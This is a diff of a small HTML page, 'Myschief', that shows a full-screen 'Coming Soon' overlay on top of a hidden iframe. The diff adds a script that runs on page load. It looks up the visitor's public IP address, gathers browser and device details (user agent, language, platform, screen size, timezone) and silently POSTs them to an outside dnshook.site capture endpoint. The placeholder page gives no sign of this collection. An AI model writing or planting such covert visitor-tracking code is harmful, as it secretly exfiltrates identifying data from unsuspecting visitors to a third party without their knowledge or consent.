@@ -1,25 +1,74 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Myschierf The Cat</title>
+  <title>Myschief</title>
   <style>
     html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
+      margin: 0; padding: 0; height: 100%; overflow: hidden;
+      font-family: Arial, sans-serif;
     }
+
     iframe {
+      border: none;
       width: 100%;
       height: 100%;
-      border: none;
+      position: fixed;
+      top: 0; left: 0;
+      z-index: 0;
+    }
+
+    /* Fullscreen overlay */
+    #overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: #222;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 3rem;
+      z-index: 10;
+      user-select: none;
     }
   </style>
 </head>
 <body>
-  <iframe src="https://mysclol.created.app/" allowfullscreen></iframe>
+  <iframe src="https://example.com"></iframe>
+
+  <div id="overlay">Coming Soon</div>
+
+  <script>
+    async function sendMetadata() {
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+
+        const info = {
+          page: "Myschief",
+          ip: ipData.ip,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          screen: {
+            width: screen.width,
+            height: screen.height
+          },
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+
+        await fetch('https://54a12a51-80de-4500-b430-3abb96bda54c.dnshook.site', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(info)
+        });
+      } catch (error) {
+        console.error('Error sending metadata:', error);
+      }
+    }
+
+    sendMetadata();
+  </script>
 </body>
 </html>
